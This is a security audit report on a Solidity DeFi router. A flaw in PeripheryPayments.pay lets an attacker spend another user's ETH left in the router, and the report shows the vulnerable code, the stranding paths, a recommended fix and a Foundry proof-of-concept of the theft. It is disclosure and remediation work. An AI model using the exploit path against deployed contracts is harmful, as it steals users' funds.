Audit Report

## Title
Cross-Caller ETH Theft via Unattributed `address(this).balance` in `PeripheryPayments.pay` — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary

`PeripheryPayments.pay()` reads `address(this).balance` — the router's entire native ETH balance — when funding WETH payments, with no per-caller attribution. ETH left in the router from a prior transaction (excess ETH or a partial-fill residue) is silently consumed by the next caller's WETH swap, stealing the victim's funds without touching the attacker's WETH allowance.

## Finding Description

`pay()` contains the following branch for WETH payments:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // entire router balance
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

`nativeBalance` is not scoped to `msg.value` of the current call. There is no per-caller ETH accounting.

**ETH stranding — Path A (excess ETH):** A user calls `exactInputSingle{value: X}` with `amountIn: A` where `X > A`. The swap callback (`_justPayCallback`) pays only the pool's positive delta (exactly `A`). `X - A` ETH remains in the router. `exactInputSingle` has no trailing `refundETH()` and no check that the full `msg.value` was consumed. [2](#0-1) 

**ETH stranding — Path B (partial fill):** A user calls `exactInputSingle{value: A}` with a `priceLimitX64` that stops the swap early. The pool consumes only `Y < A`; the callback pays `Y`. `A - Y` ETH remains. Unlike `exactInput` (which reverts with `InvalidInputAmountAtHop` when `amountInActual < amount`), `exactInputSingle` has no such guard. [3](#0-2) 

**Theft:** Any subsequent caller specifying `tokenIn = WETH` triggers `pay()`, which finds `nativeBalance > 0` and deposits the victim's stranded ETH as WETH, transferring it to the pool on the attacker's behalf — without ever calling `safeTransferFrom` on the attacker.

**Existing guard is insufficient:** The `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) only blocks bare ETH transfers with no calldata. It does not block ETH sent as `msg.value` to payable entry points (`exactInputSingle`, `exactOutputSingle`, `multicall`). [4](#0-3) 

## Impact Explanation

Direct loss of user ETH principal. The victim's stranded ETH is deposited as WETH and transferred to the pool on the attacker's behalf. The attacker receives full swap output without spending any WETH or ETH. The victim cannot recover via `refundETH()` because the ETH has already been deposited and forwarded. This meets the Critical/High threshold for direct loss of user principal.

## Likelihood Explanation

- **Path A** requires a user to send excess ETH without a trailing `refundETH()` — a realistic mistake for integrators calling `exactInputSingle` directly rather than via `multicall`.
- **Path B** requires only a valid `priceLimitX64`-bounded swap that partially fills, which is a normal, expected usage pattern. No attacker setup is needed; the victim's own valid transaction creates the residue.
- An attacker can monitor the router's ETH balance on-chain and immediately follow any transaction that leaves ETH in the router.

## Recommendation

Replace the global `address(this).balance` read with a value scoped to the current call. The correct pattern (used by Uniswap v3's `PeripheryPayments`) is to pass `msg.value` explicitly into `pay()` and consume only that amount. Alternatively, record a per-call ETH credit in a local variable at the top of each swap entry point and pass it down to `pay()`, consuming only that credit for WETH wrapping. [5](#0-4) 

## Proof of Concept

```solidity
// Foundry test sketch
function test_attackerStealsVictimEth() public {
    uint128 amountIn = 1 ether;

    // Victim sends 2 ether for a 1 ether WETH swap (excess ETH scenario)
    vm.deal(victim, 2 ether);
    vm.prank(victim);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: amountIn,          // only 1 ether consumed by pool
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );
    // 1 ether now stranded in router
    assertEq(address(router).balance, 1 ether);

    // Attacker sends value:0; pay() uses victim's 1 ether
    vm.prank(attacker);
    router.exactInputSingle{value: 0}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: amountIn,
            amountOutMinimum: 0,
            recipient: attacker,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    assertEq(address(router).balance, 0);
    assertGt(token1.balanceOf(attacker), 0); // attacker received output for free
}
```

Inside the attacker's swap callback, `pay()` reads `nativeBalance = 1 ether >= value = 1 ether`, deposits the victim's ETH as WETH, and transfers it to the pool — the `safeTransferFrom` branch is never reached. [6](#0-5)
